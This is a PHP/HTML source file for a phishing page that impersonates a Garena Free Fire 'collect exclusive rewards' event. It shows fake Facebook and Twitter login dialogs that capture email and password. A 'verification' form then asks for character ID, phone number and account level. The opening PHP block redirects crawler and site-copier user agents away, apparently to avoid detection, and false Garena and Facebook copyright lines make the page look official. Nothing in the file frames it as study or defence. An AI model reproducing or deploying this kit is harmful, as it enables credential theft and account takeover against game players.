<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title>GARENA - FREEFIRE</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="img/logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
 body {
	background: #000 center / cover no-repeat;
	margin: 0;
	font-family: 'Teko';
}
.container {
	border: 1px solid #CAB16D;
}
.navbar {
	background: #0C0C0C;
	width: 100%;
	height: 60px;
}
.navbar-logo {
	width: 100px;
    height: 30px;
    float: left;
    margin-top: 12px;
    margin-left: 13px;
}
.navbar-shop {
	width: 29px;
	margin-top: 19px;
	margin-right: 8px;
}
.navbar-menu {
	width: 20px;
	margin-top: 19px;
	margin-right: 5px;
}
.navbar-right {
	width: auto;
	float: right;
}
.navbar-download {
	background: #ffca13;
	width: 50px;
	height: 50px;
	margin-top: 10px;
	margin-right: 3px;
	border-radius: 0px;
	float: right;
}
.navbar-download img {
	width: 20px;
	height: 21px;
	margin: 13px;
}
.navbar-righ {
	width: auto;
	float: right;
}
.navbar-shp {
	width: 29px;
	margin-top: 19px;
	margin-right: 10px;
}
.event-theme {
	width:100%;
	height:60px;
	margin-top: -20px;
	margin-left:auto;
	margin-right:auto;
	padding: 5px;
	display:block;
}
.event-notification-wrapper {
	width:85%;
	height: auto;
	margin-top:20px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:5px;
	display:block;
}
.event-notification-content {
	width:100%;
	height:auto;
	bottom: -5px;
	padding:5px;
	color:#CAB16D;
	text-shadow: 0.5px 0.5px #9A7242;
	font-size: 21px;
	font-family:Teko;
	text-align: center;
}
.footer {
	background: #131313;
	width: 100%;
	height: auto;
	padding: 15px;
}
.footer-copyright-icon {
	width: 55%;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	display: block;
}
.footer-txt-copyright {
	color: #bdbdbd;
	font-size: 15px;
	font-family:Teko;
	text-align: center;
}
.item img {
    border: none;
}
.item button {
	border:1.5px solid #CAB16D;
	color:#CAB16D;
	text-shadow: 0.3px 0.3px #9A7242;
}
.nav-popup-title {
    padding-left: 15px;
	padding-top: 2px;
	color: #000;
	font-size: 22px;
	font-family:Teko;
	font-weight: 500;
	text-align: left;
}
.nav-popup img {
	width: 20px;
	height: 20px;
	margin-top: 5px;
	margin-right: 10px;
	color: #000;
	float: right;
}
.popup-alerts {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 20px;
    font-family:Teko;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 20px;
    font-family:Teko;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-alert i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #fff;
	font-size: 40px;
	text-align: center;
}
.popup-footer button:nth-child(1) {
	width: auto;
	height: auto;
	margin-top: 4px;
	margin-left:auto;
	margin-right:auto;
	padding: 3px;
	padding-left: 28px;
	padding-right: 28px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-btn-login {
    width: 40%;
    height: auto;
    padding: 6px;
    margin: 5px;
    color: #000;
	font-size: 15px;
    font-family: Teko;
    border: none;
    outline: none;
    margin-bottom: 45px;
    position: relative;
    display: line-block;
}
.popup-btn-login i {
    color: #fff;
    font-size: 23px;
    float: left;
}
.popup-btn-facebook {
    background: #4167B2;
    color: #fff;
}
.popup-btn-twitter {
    background: #198B96;
    color: #fff;
}
.popup-form-footer {
    margin-top: -16px;
}
.popup-form-footer button {
	width: auto;
	height: auto;
	margin-top: 4px;
	padding: 3px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-form input {
    background: none;
	background-size:100% 100%;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 4.4px;
	color: #fff;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border: 1px solid #fff;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-form input::placeholder {
	color: #fff;
}
.popup-form select {
    background: none;
	background-size:100% 100%;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 6px;
	color: #fff;
	font-size: 17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border: 1px solid #fff;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
</style>
<div class="container">
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://graph.org/file/f44594b4e53ed495ecb7e.jpg">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_f_w.png">
<img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_i_w.png">
<img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_y_w.png">
<div class="navbar-download"><img src="https://i.ibb.co/jwMxWFh/menu.png"></div>
<div class="navbar-righ">
<img class="navbar-shp" src="https://www.battlegroundsmobileindia.com/common/img/icon/icon_shop_50.png"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<video src="img/exp.mp4" autoplay loop muted></video>
</div> 
</div> <!--- header ---><br><br><br>
<div class="event-theme">
</div> <!--- event-theme --->
<div class="event-notification-wrapper">
<div class="event-notification-content">COLLECT EXCLUSIVE REWARDS BY - GARENA</div> <!--- event-notification-content --->
</div> <!--- event-notification-wrapper --->
<div class="box">
<center>
<div class="tab_rewards" id="latest">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.jpg">Collect</button>
</div>
</div>
<div class="event-notification-wrapper">
<div class="event-notification-content">LIMITED REWARDS - VALID FOR 30 DAYS </div> <!--- event-notification-content --->
</div> <!--- event-notification-wrapper --->
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/7.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/7.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/8.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/8.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/9.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/9.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/10.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/10.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/11.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/11.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/12.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/12.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/13.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/13.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/14.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/14.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/15.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/15.jpg">Collect</button>
</div>
</div>
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="footer">
<img class="footer-copyright-icon" src="https://graph.org/file/f44594b4e53ed495ecb7e.jpg">
<div class="footer-txt-copyright">ⓒGarena, Inc. All rights reserved.</div> 
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy</div> 
</div> 
</div> 
</div> <!--- container --->

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close.png">
<div class="nav-popup-title">Reward Confirmation</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Are you sure to collect this reward?</div> <!--- popup-alert --->
<div class="popup-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Login</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alerts">Log in using your FREEFIRE MAX account</div> <!--- popup-alert --->
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Twitter</button>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Facebook</button>
<img style="width: 90%; height: auto; margin-top: -30px; margin-left: auto; margin-right: auto;" src="https://i.postimg.cc/66bK3tfJ/Amod.png">
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer-log">
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 330px; top: -15px; text-align: left;">The email or phone number you entered does not match any account. <b>Find your account.</b></p>
<p class="kaget sandi-fb" style="width: 330px; top: -15px; text-align: left;">Incorrect password. <b>Did you forget your password?</b></p>
<img src="img/logo.jpg">
<div class="txt-login-fb">Log in to your Facebook account to connect to Freefire Max.</div> <!--- txt-login-fb --->
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Email or Mobile Number')" oninput="setCustomValidity('')">
<input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- showPassword --->
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- hidePassword --->
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create account</div> <!--- txt-create-account --->
<div class="txt-not-now">Not now</div> <!--- txt-not-now --->
<div class="txt-forgotten-password">Forgotten password?</div> <!--- txt-forgotten-password --->
</div> <!--- content-box-fb--->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name --->
<div class="language-name">Bahasa Indonesia</div> <!--- language-name --->
<div class="language-name">Basa Jawa</div> <!--- language-name --->
<div class="language-name">Bahasa Melayu</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div> <!--- copyright --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<center>
<div class="header-twitter">
<img src="https://i.ibb.co/V9rgBqw/twitter-text.png" style="margin-bottom: -35px; margin-left: 135px;">
</center>
<center>
<br><br>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter"style="text-align: left; margin-left: 95px;">Login to Twitter</div> <!--- txt-login-twitter --->
<div class="input-box-twitter">
<label>Phone, email, or username</label>
<input type="text" name="email" id="email-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Username, Email or Mobile Number')" oninput="setCustomValidity('')">
</div> <!--- input-box-twitter --->
<div class="input-box-twitter">
<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- TwitterShowPassword --->
<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- TwitterHidePassword --->
<label>Password</label>
<input type="password" style="width: 85%;" name="password" id="password-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- input-box-twitter --->
<p class="kagettw email-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Sorry, we couldn't find your account.</p>
<p class="kagettw sandi-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Wrong Password!</p>
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- header-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login--->

<div class="popup account_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Complete your account details</div> <!--- popup-alert --->
<form class="popup-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Character ID')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')">
<select name="level" id="level" required oninvalid="this.setCustomValidity('select your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Account Level(Min 50lvl)</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<br><br>
</div> <!--- popup-box-bg --->
<div class="popup-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify</button>
</div> <!--- popup-footer --->
</form> <!--- form --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup check_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
<br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
<br><br>
</div> <!--- popup-alert --->
<div class="popup-form-footer">
</div> <!--- popup-form-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Processing Account</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Thank you for joining this event
<br>
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div> <!--- popup-alert --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://ff.garena.com/en/';">Logout</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>
<script src="js/showHide.js"></script>
<script src="js/Nizam.js"></script>

</body>
</html>